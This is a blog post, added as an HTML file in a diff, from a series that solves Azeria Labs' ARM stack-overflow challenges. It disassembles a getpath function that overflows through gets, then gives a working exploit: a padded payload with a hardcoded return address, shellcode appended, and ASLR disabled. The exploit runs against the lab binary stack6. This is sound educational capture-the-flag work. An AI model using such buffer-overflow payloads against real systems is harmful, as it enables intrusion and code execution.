@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>Smashing ARM Stack for Fun - Part VII</title>
+  <meta name="description" content="It’s time to solve the last challenge of this 7 part serie.">
+
+  
+    <link href='//fonts.googleapis.com/css?family=Lato:400,400italic' rel='stylesheet' type='text/css'>
+  
+
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        extensions: ["tex2jax.js"],
+        jax: ["input/TeX","output/HTML-CSS"],
+        tex2jax: {inlineMath: [["$$","$$"],["\\(","\\)"]]},
+	TeX: {
+	  Macros: {
+            
+	  }
+	}
+      });
+    </script>
+    
+      <script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js' async></script>
+    
+  
+
+  
+    <script
+       src="https://code.jquery.com/jquery-3.4.1.min.js"
+       integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo="
+       crossorigin="anonymous"></script>
+  
+
+  
+
+    
+      <script src='https://cdnjs.cloudflare.com/ajax/libs/underscore.js/1.9.1/underscore-min.js' ></script>
+    
+
+    
+      <script src="https://d3js.org/d3.v4.min.js"></script>
+    
+
+    <script src='/book-of-gehn/js/venn/venn.min.js'></script>
+    <script src='/book-of-gehn/js/venn/helper.js'></script>
+
+    <script src='/book-of-gehn/js/fix_syntax_highlight.js'></script>
+  <link rel="stylesheet" type="text/css" href="/book-of-gehn/css/tufte.css">
+  <link rel="stylesheet" type="text/css" href="/book-of-gehn/css/latex.css">
+
+  <link rel="canonical" href="/book-of-gehn/articles/2021/02/04/Smashing-ARM-Stack-for-Fun-Part-VII.html">
+
+  <link rel="stylesheet" type="text/css" href="/book-of-gehn/css/all.min.css">
+
+  <link type="application/atom+xml" rel="alternate" href="/book-of-gehn/feed.xml" title="The Book of Gehn" />
+</head>
+
+  <body>
+    <header>
+	
+		<h1 class="header-title"><a href="/book-of-gehn/">The Book of Gehn</a></h1>
+		
+		
+	
+
+    
+
+    
+</header>
+
+    <article class="group">
+      <h1>Smashing ARM Stack for Fun - Part VII</h1>
+<p class="subtitle">February 4, 2021</p>
+
+<p>It’s time to solve the last challenge of this 7 part serie.<!--more--></p>
+
+<h2 id="the-vuln">The vuln</h2>
+
+<p>This time the overflow is not in <code class="highlighter-rouge">main</code> but in called function named
+<code class="highlighter-rouge">getpath</code> but besides that, it is the classical unbounded <code class="highlighter-rouge">gets</code>
+vulnerability.</p>
+
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">pdisass</span> <span class="o">&amp;</span><span class="n">main</span> <span class="mi">10</span>
+ <span class="err">►</span> <span class="mh">0x10560</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">&gt;</span>                 <span class="k">push</span>   <span class="err">{</span><span class="n">fp</span><span class="p">,</span> <span class="n">lr</span><span class="err">}</span>
+   <span class="mh">0x10564</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">4</span><span class="o">&gt;</span>               <span class="k">add</span>    <span class="n">fp</span><span class="p">,</span> <span class="n">sp</span><span class="p">,</span> <span class="err">#</span><span class="mi">4</span>
+   <span class="mh">0x10568</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">8</span><span class="o">&gt;</span>               <span class="k">sub</span>    <span class="n">sp</span><span class="p">,</span> <span class="n">sp</span><span class="p">,</span> <span class="err">#</span><span class="mi">8</span>
+   <span class="mh">0x1056c</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">12</span><span class="o">&gt;</span>              <span class="k">str</span>    <span class="n">r0</span><span class="p">,</span> <span class="err">[</span><span class="n">fp</span><span class="p">,</span> <span class="err">#</span><span class="o">-</span><span class="mi">8</span><span class="err">]</span>
+   <span class="mh">0x10570</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">16</span><span class="o">&gt;</span>              <span class="k">str</span>    <span class="n">r1</span><span class="p">,</span> <span class="err">[</span><span class="n">fp</span><span class="p">,</span> <span class="err">#</span><span class="o">-</span><span class="mh">0xc</span><span class="err">]</span>
+   <span class="mh">0x10574</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">20</span><span class="o">&gt;</span>              <span class="n">bl</span>     <span class="err">#</span><span class="n">getpath</span> <span class="o">&lt;</span><span class="n">getpath</span><span class="o">&gt;</span>
+
+   <span class="mh">0x10578</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">24</span><span class="o">&gt;</span>              <span class="k">mov</span>    <span class="n">r0</span><span class="p">,</span> <span class="n">r3</span>
+   <span class="mh">0x1057c</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">28</span><span class="o">&gt;</span>              <span class="k">sub</span>    <span class="n">sp</span><span class="p">,</span> <span class="n">fp</span><span class="p">,</span> <span class="err">#</span><span class="mi">4</span>
+   <span class="mh">0x10580</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">32</span><span class="o">&gt;</span>              <span class="k">pop</span>    <span class="err">{</span><span class="n">fp</span><span class="p">,</span> <span class="n">pc</span><span class="err">}</span>
+</code></pre></div></div>
+
+<p><label for="mmkd-c5a21cf59387034726893ebb4a4d5187" class="margin-toggle"> ⊕</label><input type="checkbox" id="mmkd-c5a21cf59387034726893ebb4a4d5187" class="margin-toggle" /></p>
+<div id="mk-mmkd-c5a21cf59387034726893ebb4a4d5187"><span class="marginnote marginmarkdowncode"><div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">p</span> <span class="p">(</span><span class="n">char</span><span class="o">*</span><span class="p">)(</span><span class="o">*</span><span class="p">(</span><span class="mh">0x104e8</span> <span class="o">+</span> <span class="mh">0x60</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">))</span>
+<span class="err">$</span><span class="mi">7</span> <span class="o">=</span> <span class="mh">0x105f8</span> <span class="s">"input path please: "</span>
+
+<span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">p</span> <span class="p">(</span><span class="n">char</span><span class="o">*</span><span class="p">)(</span><span class="o">*</span><span class="p">(</span><span class="mh">0x10524</span> <span class="o">+</span> <span class="mh">0x2c</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">))</span>
+<span class="err">$</span><span class="mi">8</span> <span class="o">=</span> <span class="mh">0x1060c</span> <span class="s">"bzzzt (%p)</span><span class="se">\n</span><span class="s">"</span>
+
+<span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">p</span> <span class="p">(</span><span class="n">char</span><span class="o">*</span><span class="p">)(</span><span class="o">*</span><span class="p">(</span><span class="mh">0x1053c</span> <span class="o">+</span> <span class="mh">0x18</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">))</span>
+<span class="err">$</span><span class="mi">9</span> <span class="o">=</span> <span class="mh">0x10618</span> <span class="s">"got path %s</span><span class="se">\n</span><span class="s">"</span>
+</code></pre></div></div></span></div>
+<div><script>$(document).ready(function () {$('#mk-mmkd-c5a21cf59387034726893ebb4a4d5187 > span').insertAfter($('#mmkd-c5a21cf59387034726893ebb4a4d5187'))});</script></div>
+
+<p>Here is the <code class="highlighter-rouge">getpath</code> function. I added some notes in addition to the
+disassembly:</p>
+
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">pdisass</span> <span class="o">&amp;</span><span class="n">getpath</span> <span class="mi">15</span>
+ <span class="err">►</span> <span class="mh">0x104d8</span> <span class="o">&lt;</span><span class="n">getpath</span><span class="o">&gt;</span>        <span class="k">push</span>   <span class="err">{</span><span class="n">r4</span><span class="p">,</span> <span class="n">fp</span><span class="p">,</span> <span class="n">lr</span><span class="err">}</span>
+   <span class="mh">0x104dc</span> <span class="o">&lt;</span><span class="n">getpath</span><span class="o">+</span><span class="mi">4</span><span class="o">&gt;</span>      <span class="k">add</span>    <span class="n">fp</span><span class="p">,</span> <span class="n">sp</span><span class="p">,</span> <span class="err">#</span><span class="mi">8</span>
+   <span class="mh">0x104e0</span> <span class="o">&lt;</span><span class="n">getpath</span><span class="o">+</span><span class="mi">8</span><span class="o">&gt;</span>      <span class="k">sub</span>    <span class="n">sp</span><span class="p">,</span> <span class="n">sp</span><span class="p">,</span> <span class="err">#</span><span class="mh">0x4c</span>
+   <span class="mh">0x104e4</span> <span class="o">&lt;</span><span class="n">getpath</span><span class="o">+</span><span class="mi">12</span><span class="o">&gt;</span>     <span class="k">mov</span>    <span class="n">r4</span><span class="p">,</span> <span class="n">lr</span>
+   <span class="mh">0x104e8</span> <span class="o">&lt;</span><span class="n">getpath</span><span class="o">+</span><span class="mi">16</span><span class="o">&gt;</span>     <span class="n">ldr</span>    <span class="n">r0</span><span class="p">,</span> <span class="err">[</span><span class="n">pc</span><span class="p">,</span> <span class="err">#</span><span class="mh">0x60</span><span class="err">]</span>
+   <span class="mh">0x104ec</span> <span class="o">&lt;</span><span class="n">getpath</span><span class="o">+</span><span class="mi">20</span><span class="o">&gt;</span>     <span class="n">bl</span>     <span class="err">#</span><span class="n">printf</span><span class="err">@</span><span class="n">plt</span> <span class="o">&lt;</span><span class="n">printf</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span> <span class="c">; "input path please: "</span>
+
+   <span class="mh">0x104f0</span> <span class="o">&lt;</span><span class="n">getpath</span><span class="o">+</span><span class="mi">24</span><span class="o">&gt;</span>     <span class="n">ldr</span>    <span class="n">r3</span><span class="p">,</span> <span class="err">[</span><span class="n">pc</span><span class="p">,</span> <span class="err">#</span><span class="mh">0x5c</span><span class="err">]</span>
+   <span class="mh">0x104f4</span> <span class="o">&lt;</span><span class="n">getpath</span><span class="o">+</span><span class="mi">28</span><span class="o">&gt;</span>     <span class="n">ldr</span>    <span class="n">r3</span><span class="p">,</span> <span class="p">[r3]</span>
+   <span class="mh">0x104f8</span> <span class="o">&lt;</span><span class="n">getpath</span><span class="o">+</span><span class="mi">32</span><span class="o">&gt;</span>     <span class="k">mov</span>    <span class="n">r0</span><span class="p">,</span> <span class="n">r3</span>
+   <span class="mh">0x104fc</span> <span class="o">&lt;</span><span class="n">getpath</span><span class="o">+</span><span class="mi">36</span><span class="o">&gt;</span>     <span class="n">bl</span>     <span class="err">#</span><span class="n">fflush</span><span class="err">@</span><span class="n">plt</span> <span class="o">&lt;</span><span class="n">fflush</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
+
+   <span class="mh">0x10500</span> <span class="o">&lt;</span><span class="n">getpath</span><span class="o">+</span><span class="mi">40</span><span class="o">&gt;</span>     <span class="k">sub</span>    <span class="n">r3</span><span class="p">,</span> <span class="n">fp</span><span class="p">,</span> <span class="err">#</span><span class="mh">0x50</span>
+   <span class="mh">0x10504</span> <span class="o">&lt;</span><span class="n">getpath</span><span class="o">+</span><span class="mi">44</span><span class="o">&gt;</span>     <span class="k">mov</span>    <span class="n">r0</span><span class="p">,</span> <span class="n">r3</span>
+   <span class="mh">0x10508</span> <span class="o">&lt;</span><span class="n">getpath</span><span class="o">+</span><span class="mi">48</span><span class="o">&gt;</span>     <span class="n">bl</span>     <span class="err">#</span><span class="n">gets</span><span class="err">@</span><span class="n">plt</span> <span class="o">&lt;</span><span class="n">gets</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
+
+   <span class="mh">0x1050c</span> <span class="o">&lt;</span><span class="n">getpath</span><span class="o">+</span><span class="mi">52</span><span class="o">&gt;</span>     <span class="k">mov</span>    <span class="n">r3</span><span class="p">,</span> <span class="n">r4</span>
+   <span class="mh">0x10510</span> <span class="o">&lt;</span><span class="n">getpath</span><span class="o">+</span><span class="mi">56</span><span class="o">&gt;</span>     <span class="k">str</span>    <span class="n">r3</span><span class="p">,</span> <span class="err">[</span><span class="n">fp</span><span class="p">,</span> <span class="err">#</span><span class="o">-</span><span class="mh">0x10</span><span class="err">]</span>
+   <span class="mh">0x10514</span> <span class="o">&lt;</span><span class="n">getpath</span><span class="o">+</span><span class="mi">60</span><span class="o">&gt;</span>     <span class="n">ldr</span>    <span class="n">r3</span><span class="p">,</span> <span class="err">[</span><span class="n">fp</span><span class="p">,</span> <span class="err">#</span><span class="o">-</span><span class="mh">0x10</span><span class="err">]</span>
+   <span class="mh">0x10518</span> <span class="o">&lt;</span><span class="n">getpath</span><span class="o">+</span><span class="mi">64</span><span class="o">&gt;</span>     <span class="k">and</span>    <span class="n">r3</span><span class="p">,</span> <span class="n">r3</span><span class="p">,</span> <span class="err">#</span><span class="mh">0xbf000000</span>  <span class="c">; bin 1011 1111 0...</span>
+   <span class="mh">0x1051c</span> <span class="o">&lt;</span><span class="n">getpath</span><span class="o">+</span><span class="mi">68</span><span class="o">&gt;</span>     <span class="k">cmp</span>    <span class="n">r3</span><span class="p">,</span> <span class="err">#</span><span class="mh">0xbf000000</span>
+   <span class="mh">0x10520</span> <span class="o">&lt;</span><span class="n">getpath</span><span class="o">+</span><span class="mi">72</span><span class="o">&gt;</span>     <span class="n">bne</span>    <span class="err">#</span><span class="n">getpath</span><span class="o">+</span><span class="mi">96</span> <span class="o">&lt;</span><span class="n">getpath</span><span class="o">+</span><span class="mi">96</span><span class="o">&gt;</span>
+
+   <span class="mh">0x10524</span> <span class="o">&lt;</span><span class="n">getpath</span><span class="o">+</span><span class="mi">76</span><span class="o">&gt;</span>     <span class="n">ldr</span>    <span class="n">r0</span><span class="p">,</span> <span class="err">[</span><span class="n">pc</span><span class="p">,</span> <span class="err">#</span><span class="mh">0x2c</span><span class="err">]</span>
+   <span class="mh">0x10528</span> <span class="o">&lt;</span><span class="n">getpath</span><span class="o">+</span><span class="mi">80</span><span class="o">&gt;</span>     <span class="n">ldr</span>    <span class="n">r1</span><span class="p">,</span> <span class="err">[</span><span class="n">fp</span><span class="p">,</span> <span class="err">#</span><span class="o">-</span><span class="mh">0x10</span><span class="err">]</span>
+   <span class="mh">0x1052c</span> <span class="o">&lt;</span><span class="n">getpath</span><span class="o">+</span><span class="mi">84</span><span class="o">&gt;</span>     <span class="n">bl</span>     <span class="err">#</span><span class="n">printf</span><span class="err">@</span><span class="n">plt</span> <span class="o">&lt;</span><span class="n">printf</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span> <span class="c">; "bzzzt (%p)\n"</span>
+
+   <span class="mh">0x10530</span> <span class="o">&lt;</span><span class="n">getpath</span><span class="o">+</span><span class="mi">88</span><span class="o">&gt;</span>     <span class="k">mov</span>    <span class="n">r0</span><span class="p">,</span> <span class="err">#</span><span class="mi">1</span>
+   <span class="mh">0x10534</span> <span class="o">&lt;</span><span class="n">getpath</span><span class="o">+</span><span class="mi">92</span><span class="o">&gt;</span>     <span class="n">bl</span>     <span class="err">#</span><span class="n">_exit</span><span class="err">@</span><span class="n">plt</span> <span class="o">&lt;</span><span class="n">_exit</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
+
+   <span class="mh">0x10538</span> <span class="o">&lt;</span><span class="n">getpath</span><span class="o">+</span><span class="mi">96</span><span class="o">&gt;</span>     <span class="k">sub</span>    <span class="n">r3</span><span class="p">,</span> <span class="n">fp</span><span class="p">,</span> <span class="err">#</span><span class="mh">0x50</span>
+   <span class="mh">0x1053c</span> <span class="o">&lt;</span><span class="n">getpath</span><span class="o">+</span><span class="mi">100</span><span class="o">&gt;</span>    <span class="n">ldr</span>    <span class="n">r0</span><span class="p">,</span> <span class="err">[</span><span class="n">pc</span><span class="p">,</span> <span class="err">#</span><span class="mh">0x18</span><span class="err">]</span>
+   <span class="mh">0x10540</span> <span class="o">&lt;</span><span class="n">getpath</span><span class="o">+</span><span class="mi">104</span><span class="o">&gt;</span>    <span class="k">mov</span>    <span class="n">r1</span><span class="p">,</span> <span class="n">r3</span>
+   <span class="mh">0x10544</span> <span class="o">&lt;</span><span class="n">getpath</span><span class="o">+</span><span class="mi">108</span><span class="o">&gt;</span>    <span class="n">bl</span>     <span class="err">#</span><span class="n">printf</span><span class="err">@</span><span class="n">plt</span> <span class="o">&lt;</span><span class="n">printf</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span> <span class="c">; "got path %s\n"</span>
+
+   <span class="mh">0x10548</span> <span class="o">&lt;</span><span class="n">getpath</span><span class="o">+</span><span class="mi">112</span><span class="o">&gt;</span>    <span class="k">sub</span>    <span class="n">sp</span><span class="p">,</span> <span class="n">fp</span><span class="p">,</span> <span class="err">#</span><span class="mi">8</span>
+   <span class="mh">0x1054c</span> <span class="o">&lt;</span><span class="n">getpath</span><span class="o">+</span><span class="mi">116</span><span class="o">&gt;</span>    <span class="k">pop</span>    <span class="err">{</span><span class="n">r4</span><span class="p">,</span> <span class="n">fp</span><span class="p">,</span> <span class="n">pc</span><span class="err">}</span>
+</code></pre></div></div>
+
+<p>Writing 0x50 bytes we overwrite the stack just before
+writing the <em>ret</em> address: 0x4 more bytes and we are done.</p>
+
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="err">►</span> <span class="mh">0x104d8</span> <span class="o">&lt;</span><span class="n">getpath</span><span class="o">&gt;</span>        <span class="k">push</span>   <span class="err">{</span><span class="n">r4</span><span class="p">,</span> <span class="n">fp</span><span class="p">,</span> <span class="n">lr</span><span class="err">}</span>
+   <span class="mh">0x104dc</span> <span class="o">&lt;</span><span class="n">getpath</span><span class="o">+</span><span class="mi">4</span><span class="o">&gt;</span>      <span class="k">add</span>    <span class="n">fp</span><span class="p">,</span> <span class="n">sp</span><span class="p">,</span> <span class="err">#</span><span class="mi">8</span>
+   <span class="p">...</span>
+   <span class="mh">0x10500</span> <span class="o">&lt;</span><span class="n">getpath</span><span class="o">+</span><span class="mi">40</span><span class="o">&gt;</span>     <span class="k">sub</span>    <span class="n">r3</span><span class="p">,</span> <span class="n">fp</span><span class="p">,</span> <span class="err">#</span><span class="mh">0x50</span>
+   <span class="mh">0x10504</span> <span class="o">&lt;</span><span class="n">getpath</span><span class="o">+</span><span class="mi">44</span><span class="o">&gt;</span>     <span class="k">mov</span>    <span class="n">r0</span><span class="p">,</span> <span class="n">r3</span>
+   <span class="mh">0x10508</span> <span class="o">&lt;</span><span class="n">getpath</span><span class="o">+</span><span class="mi">48</span><span class="o">&gt;</span>     <span class="n">bl</span>     <span class="err">#</span><span class="n">gets</span><span class="err">@</span><span class="n">plt</span> <span class="o">&lt;</span><span class="n">gets</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
+</code></pre></div></div>
+
+<figure><figcaption><span></span></figcaption><object align="middle" data="/book-of-gehn/uml/665e22a8428ba6e2aa2f8675a62f328f1c7ac9aa.svg" type="image/svg+xml"></object></figure>
+
+<p>The stack pointer <code class="highlighter-rouge">sp</code> after <code class="highlighter-rouge">getpath</code>
+returns will be at <em>4 bytes more</em>  than <code class="highlighter-rouge">fp</code> <em>before</em> the return:</p>
+
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="mi">1</span><span class="n">wx</span> <span class="err">$</span><span class="n">fp</span>   <span class="c">; before getpath returns</span>
+<span class="mh">0xbefffb84</span><span class="o">:</span>     <span class="mh">0x00010578</span> <span class="c">; &lt;-- ret address (to main)</span>
+
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="k">bt</span>
+<span class="err">#</span><span class="mi">0</span>  <span class="mh">0x000104e8</span> <span class="k">in</span> <span class="n">getpath</span> <span class="p">()</span>
+<span class="err">#</span><span class="mi">1</span>  <span class="mh">0x00010578</span> <span class="k">in</span> <span class="n">main</span> <span class="p">()</span>
+</code></pre></div></div>
+
+<figure><figcaption><span></span></figcaption><object align="middle" data="/book-of-gehn/uml/a512ceab1c386ea1b5bfb6ac21a476f21c7ac9aa.svg" type="image/svg+xml"></object></figure>
+
+<h2 id="the-attack-without-dep-and-aslr">The attack (without DEP and ASLR)</h2>
+
+<p>The <code class="highlighter-rouge">egg.text</code> is the same one used in the
+<a href="/book-of-gehn/articles/2021/01/26/Smashing-ARM-Stack-for-Fun-Part-VI.html">part 6</a>.</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pi@raspberrypi:~<span class="nv">$ </span><span class="nb">echo</span> <span class="nt">-ne</span> <span class="s1">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x88\xfb\xff\xbe'</span> <span class="o">&gt;</span> exploit
+pi@raspberrypi:~<span class="nv">$ </span><span class="nb">cat </span>egg.text <span class="o">&gt;&gt;</span> exploit
+
+pi@raspberrypi:~<span class="nv">$ </span><span class="nb">rm</span> <span class="nt">-f</span> pwned_proof
+
+pi@raspberrypi:~<span class="nv">$ </span>setarch linux32 <span class="nt">--addr-no-randomize</span> /bin/bash
+
+<span class="o">(</span>aslr disabled<span class="o">)</span> pi@raspberrypi:~<span class="nv">$ </span><span class="nb">cat </span>exploit | ./stack6
+<span class="o">(</span>aslr disabled<span class="o">)</span> pi@raspberrypi:~<span class="nv">$ </span><span class="nb">echo</span> <span class="nv">$?</span>
+0
+
+<span class="o">(</span>aslr disabled<span class="o">)</span> pi@raspberrypi:~<span class="nv">$ </span><span class="nb">cat </span>pwned_proof
+pwn!
+</code></pre></div></div>
+
+<h2 id="future-work">Future work</h2>
+
+<p>This is the last part of the
+<a href="https://github.com/azeria-labs/ARM-challenges">ARM challenges</a> from
+<a href="https://azeria-labs.com">Azeria Labs</a>.</p>
+
+<p>However there are a lot of things to explore, tweak and stretch.</p>
+
+<p>In the
+<a href="/book-of-gehn/articles/2021/01/26/Smashing-ARM-Stack-for-Fun-Part-VI.html">part 6</a>
+I coded a ARM egg, the next obvious step would be write the same egg in
+Thumb mode.</p>
+
+<p>So far, the egg was always loaded in the stack and executed there. In
+these modern days, the stack is <strong>not</strong> executable so it would be cool
+to learn how to bypass this restriction (known as Data Execution
+Prevention <em>DEP</em> or Write-xor-Execute <em>W+E</em>).</p>
+
+<p>Since <a href="/book-of-gehn/articles/2021/01/20/Smashing-ARM-Stack-for-Fun-Part-V.html">part 5</a>
+we were <em>hardcoding</em> addresses. <em>Shame on me</em>.</p>
+
+<p>Address Space Layout Randomization <em>(ASLR)</em> is a well established feature
+of modern OS to randomize the <em>base address</em> of the loaded libraries.
+Bypassing techniques exist since at least 2007 so it is a definitely
+topic to learn.</p>
+
+
+
+    </article>
+    <span class="print-footer">Smashing ARM Stack for Fun - Part VII - February 4, 2021 - Gehn</span>
+    <footer>
+    <hr class="slender">
+    <div class="credits">
+        <span>&copy; 2021
+            
+            Gehn
+        </span></br>
+            <a style="text-decoration: none;" href="/book-of-gehn/feed.xml"><img height="16px" width="16px" src="/book-of-gehn/assets/blog-assets/rss-32px.png" /></a>
+        <br>
+        
+
+    
+    </div>
+</footer>
+
+  </body>
+</html>
